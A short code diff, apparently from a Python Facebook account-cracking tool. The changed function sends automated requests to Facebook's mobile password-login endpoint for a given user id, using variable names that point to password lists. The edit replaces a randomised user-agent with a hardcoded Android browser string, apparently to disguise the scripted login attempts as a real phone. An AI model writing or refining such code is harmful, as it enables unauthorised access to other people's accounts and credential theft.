@@ -281,7 +281,7 @@ def sinsAPI_(uid, names, pxss_, tot4l):
                 "priority": "u=1",
                 "cross-origin-resource-policy": "cross-origin",
                 "upgrade-insecure-requests": "1",
-                "user-agent": str(PyBookAgents.random_ugen()),
+                "user-agent": "Mozilla/5.0 (Linux; Android 8; RMX3551 Build/WP0X.181242.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5702.121 YaBrowser/24.3.8.164 Mobile Safari/537.36",
             }
             I = C.get(
                 f"https://m.facebook.com/login/device-based/password/?uid={A}&flow=login_no_pin&refsrc=deprecated&_rdr"
@@ -343,3 +343,4 @@ if __name__ == "__main__":
         sintx_menu()
     except Exception as e:
         exit()
+        
